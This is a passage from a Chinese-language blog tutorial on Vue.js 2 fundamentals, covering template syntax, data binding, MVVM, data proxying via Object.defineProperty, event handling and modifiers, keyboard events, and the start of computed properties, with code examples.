&#123; </span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">name</span>:<span class="string">&#x27;你好世界&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">methods</span>: &#123;&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">el</span>: <span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">data</span>: &#123; </span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">address</span>:<span class="string">&#x27;中国&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">methods</span>: &#123;&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>JS表达式和JS代码</p></blockquote><ul><li><p>表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方</p></li><li><p>js代码(语句)：<code>if()&#123;&#125; for()&#123;&#125;等等</code></p></li><li><p>真实开发中只有一个Vue实例，并且会配合组件一起使用</p></li><li><p>一旦data中的数据发生改变，那么模板中用到该数据的地方也会自动更新。</p></li></ul><h1 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h1><h2 id="插值"><a href="#插值" class="headerlink" title="插值"></a>插值</h2><p>Vue模板语法有两大类：</p><ul><li>插值语法：<ul><li>功能：用于解析标签体内容</li><li>写法：,xxx是js表达式，且可以直接读取到data中的所有属性</li></ul></li><li>指令语法：<ul><li>功能：用于解析标签(包括：标签属性、标签体内容、绑定事件…)</li><li>举例：v-bind:href=”xxx”或省略v-bind，xxx同样要写js表达式，且可以直接读取data中的所有属性</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id =<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">    <span class="comment">// 插值语法</span></span><br><span class="line">        &#123;&#123;name&#125;&#125;, &#123;&#123;addres.toUpperCase()&#125;&#125; &#123;&#123;<span class="built_in">Date</span>.now()&#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="comment">//创建Vue实例,得到 ViewModel</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">       <span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">name</span>: <span class="string">&quot;你好 世界&quot;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">addres</span>: <span class="string">&quot;hhh is me&quot;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">url</span>: <span class="string">&quot;https://www.baidu.com&quot;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><h3 id="数据绑定"><a href="#数据绑定" class="headerlink" title="数据绑定"></a>数据绑定</h3><p>Vue有两种数据绑定的方式：</p><ol><li>单向绑定(v-bind)：数据只能从data流向页面</li><li>双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data</li></ol><p><code>v-model</code>只能用在标签行内</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id =<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">        单向数据绑定:<span class="xml"><span class="tag">&lt;<span class="name">a</span>  <span class="attr">v-bind:href</span>=<span class="string">&quot;url&quot;</span>&gt;</span>点我跳转<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">        双向数据绑定:<span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">v-bind:value</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">    双向数据绑定:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model:value</span>=<span class="string">&quot;username&quot;</span> &gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="comment">//创建Vue实例,得到 ViewModel</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">username</span>:<span class="string">&quot;你好&quot;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">url</span>: <span class="string">&quot;https://www.baidu.com&quot;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="MVVM-模型"><a href="#MVVM-模型" class="headerlink" title="MVVM 模型"></a>MVVM 模型</h3><p>MVVM 模式，即指 Model-View-ViewModel。它将 View 的状态和行为完全抽象化，把逻辑与界面的控制完全交给 ViewModel 处理</p><ol><li>M：模型(Model) ：对应 data 中的数据</li><li>V：视图(View) ：模板</li><li>VM：视图模型(ViewModel) ： Vue 实例对象</li></ol><ul><li>data中所有的属性，最后都出现在了vm身上</li><li>vm身上所有的属性，及Vue原型上所有属性，在Vue模板中都可以直接使用 如<code>&#123;&#123;$options&#125;&#125; &#123;&#123;$emit&#125;&#125;</code>均有结果出现。</li></ul><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202222101994.png"></p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202222113507.png"></p><h3 id="数据代理"><a href="#数据代理" class="headerlink" title="数据代理"></a>数据代理</h3><h4 id="Object-defineProperty"><a href="#Object-defineProperty" class="headerlink" title="Object.defineProperty"></a>Object.defineProperty</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="number">18</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> person = &#123;</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&#x27;cez&#x27;</span>,</span><br><span class="line">        <span class="attr">sex</span>:<span class="string">&quot;男&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(person,<span class="string">&#x27;age&#x27;</span>,&#123;</span><br><span class="line">        <span class="comment">// value:20,</span></span><br><span class="line">        <span class="comment">// enumerable:true,  //控制属性是否可以枚举，默认为false</span></span><br><span class="line">        <span class="comment">// writable:true,     //控制属性是否可以修改，默认为false</span></span><br><span class="line">        <span class="comment">// configurable:true, //控制属性是否可以删除，默认为false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值</span></span><br><span class="line">        <span class="attr">get</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;读取age属性&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> number;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">//当有人修改person的age属性时，set函数(setter)就会被调用，且返回值就是修改的具体值</span></span><br><span class="line">        <span class="attr">set</span>:<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;修改了age属性,且值为&quot;</span>,value)</span><br><span class="line">            number = value</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">console</span>.log(person.value);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="数据代理-1"><a href="#数据代理-1" class="headerlink" title="数据代理"></a>数据代理</h4><ul><li>数据代理：通过一个对象代理另一个对象中属性的操作(读/写)</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">let</span> obj = &#123;<span class="attr">x</span>:<span class="number">100</span>&#125;</span><br><span class="line">    <span class="keyword">let</span> obj2 = &#123;<span class="attr">y</span>:<span class="number">200</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(obj2,<span class="string">&#x27;x&#x27;</span>,&#123;</span><br><span class="line">        <span class="function"><span class="title">get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> obj.x;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">set</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">            obj.x = value</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="vue中的数据代理"><a href="#vue中的数据代理" class="headerlink" title="vue中的数据代理"></a>vue中的数据代理</h4><ul><li>Vue通过vm对象来代理data对象中属性的操作(读写)</li><li>Vue中数据代理的好处：更方便地操作data中的数据</li><li>基本原理：通过<code>Object.defineProperty()</code>把data对象中所有属性添加到vm上，为每一个添加到vm上的属性都指定一个getter/setter，在getter/setter内部去操作data中的属性</li></ul><h3 id="el与data的两种写法"><a href="#el与data的两种写法" class="headerlink" title="el与data的两种写法"></a>el与data的两种写法</h3><ul><li>el两种写法：<ul><li>new Vue的时候配置el属性</li><li>先创建Vue实例，随后通过.$mount()挂载</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;root&quot;</span>&gt; </span><br><span class="line">       </span><br><span class="line">        你好&#123;&#123;name&#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    Vue.config.productionTip = <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">let</span> v = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="comment">// 简写</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="keyword">return</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="attr">name</span>:<span class="string">&quot;hhh4&quot;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    v.$mount(<span class="string">&quot;#root&quot;</span>);  <span class="comment">// $mount可以代替el绑定容器</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>data两种写法：</p><ul><li>对象式</li><li>函数式(写组件时必须用函数式)</li><li>由Vue管理的函数，一定不要写箭头函数，一旦写箭头函数，this就不再是Vue实例了</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id =<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">    &#123;&#123;name&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">         <span class="comment">// 第一种对象式数据</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="comment">// data:&#123;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="comment">//     name: &quot;hhh&quot;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="comment">// &#125;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="comment">//第二种写法</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">data</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="built_in">console</span>.log(<span class="built_in">this</span>)<span class="comment">//此处的this是Vue实例对象</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="attr">name</span>:<span class="string">&#x27;cez&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="comment">// 简写</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="keyword">return</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="attr">name</span>:<span class="string">&quot;hhh4&quot;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="comment">//  第二种函数式</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="comment">// data:data</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">methods</span>: &#123;&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h2><ol><li>使用<code>v-on:xxx</code>或<code>@xxx</code>绑定事件，其中xxx是事件名</li><li>事件的回调需要配置在methods对象中，最终会在vm上</li><li>methods中配置的函数，不要用箭头函数！否则this就不是vm了</li><li>methods中配置的函数都是被Vue管理的函数，this指向的是vm或组件实例对象</li><li><code>@click=&quot;demo&quot;</code>和<code>@click=&quot;demo($event)&quot;</code>效果一样，但后者可以传参</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;root&quot;</span>&gt; </span><br><span class="line">        <span class="xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;showText&quot;</span>&gt;</span>&#123;&#123;buttonValue&#125;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">        &lt;!-- 简写 --&gt;</span><br><span class="line">        <span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showText()&quot;</span>&gt;</span>&#123;&#123;buttonValue2&#125;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">        <span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showText(66, $event)&quot;</span>&gt;</span>&#123;&#123;buttonValue3&#125;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">        &lt;!-- 阻止默认事件 --&gt;</span><br><span class="line">        <span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span> @<span class="attr">click.prevent</span>=<span class="string">&quot;showText(66, $event)&quot;</span>&gt;</span>&#123;&#123;buttonValue3&#125;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"> <span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">     <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">         <span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">         <span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">             <span class="attr">buttonValue</span>: <span class="string">&quot;点我提示信息&quot;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">             <span class="attr">buttonValue2</span>: <span class="string">&quot;点我提示信息简写后的点击&quot;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">             <span class="attr">buttonValue3</span>: <span class="string">&quot;传入event&quot;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">methods</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="function"><span class="title">showText</span>(<span class="params">number, a</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="built_in">console</span>.log(number, a.target.innerHTML);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">     &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202222107126.png"></p><h3 id="绑定事件监听"><a href="#绑定事件监听" class="headerlink" title="绑定事件监听"></a>绑定事件监听</h3><ol><li>v-on:xxx=”fun” </li><li> @xxx=”fun” </li><li> @xxx=”fun(参数)” </li><li>默认事件形参: event </li><li>隐含属性对象: $event</li></ol><h3 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符"></a>事件修饰符</h3><ol><li>.prevent : 阻止事件的默认行为 event.preventDefault() </li><li>.stop : 停止事件冒泡 event.stopPropagation</li><li>once：只触发一次(常用)</li><li>capture：使用事件的捕获模式(事件在捕获时就进行处理，而不是在冒泡时)</li><li>self：只有event.target是当前操作的元素时才触发事件</li><li>passive：事件的默认行为立即执行，无需等待事件回调执行完毕</li><li><code>.left</code> - (2.2.0) 只当点击鼠标左键时触发。</li><li><code>.right</code> - (2.2.0) 只当点击鼠标右键时触发。</li><li><code>.middle</code> - (2.2.0) 只当点击鼠标中键时触发。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">事件冒泡 ：当一个元素接收到事件的时候 会把他接收到的事件传给自己的父级，一直到window (注意这里传递的仅仅是事件 并不传递所绑定的事件函数。所以如果父级没有绑定事件函数，就算传递了事件 也不会有什么表现 但事件确实传递了。)</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="template属性"><a href="#template属性" class="headerlink" title="template属性"></a>template属性</h2><p>一个字符串模板作为 Vue 实例的标识使用。模板将会<strong>替换</strong>挂载的元素。挂载元素的内容都将被忽略，除非模板的内容有分发插槽。</p><blockquote><p>如果值以 <code>#</code> 开始，则它将被用作选择符，并使用匹配元素的 innerHTML 作为模板。常用的技巧是用 <code>&lt;script type=&quot;x-template&quot;&gt;</code> 包含模板。</p></blockquote><h2 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h2><p>Vue中常用的按键别名：</p><ul><li><p>回车：enter</p></li><li><p>删除：delete(捕获删除键和退格键)</p></li><li><p>退出：esc</p></li><li><p>空格：space</p></li><li><p>换行：tab(最好用keydown，因为keyup前已经切换焦点了)</p></li><li><p>上：up</p></li><li><p>下：down</p></li><li><p>左：left</p></li><li><p>右：right</p></li><li><p>Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-base(短横线命名)</p></li></ul><p>系统修饰键(用法特殊):ctrl、alt、shift、meta</p><ul><li><p>配合keyup使用：按下修饰键的同时再按下其他键，随后释放其他键，事件才被触发</p></li><li><p>配合keydown使用：正常触发事件</p></li><li><p>也可以使用keyCode去指定具体的按键(不推荐,已废弃)</p></li><li><p>Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">   &lt;div id=<span class="string">&quot;root&quot;</span>&gt;</span><br><span class="line">       <span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;按下回车提示输入&quot;</span> @<span class="attr">keyup.ctrl.k</span>=<span class="string">&quot;showInfo&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">   Vue.config.productionTip = <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">   <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">       <span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">       <span class="attr">data</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">           <span class="keyword">return</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">               <span class="attr">name</span>: <span class="string">&quot;hhh&quot;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">           &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">       &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">       <span class="attr">methods</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">           <span class="function"><span class="title">showInfo</span>(<span class="params">e</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// if(e.keyCode === 13)&#123;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// console.log(e.target.value)</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// &#125;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(e.target.value)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">           &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">       &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">   &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>事件的修饰符可以连写 如<code>@click.stop.prevent</code></li></ul><h2 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h2><ul><li><p>定义：要用的属性不存在，要通过<strong>已有的属性</strong>计算得来</p></li><li><p>原理：底层借助了<code>Object.defineproperty</code>方法提供的getter和setter</p></li><li><p>优势： 与methods实现相比，内部有缓存机制(复用)，效率更高，调式方便</p></li><li><p>计算属性最终会出现在vm上，直接读取使用即可</p></li><li><p>如果计算属性要被修改，必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 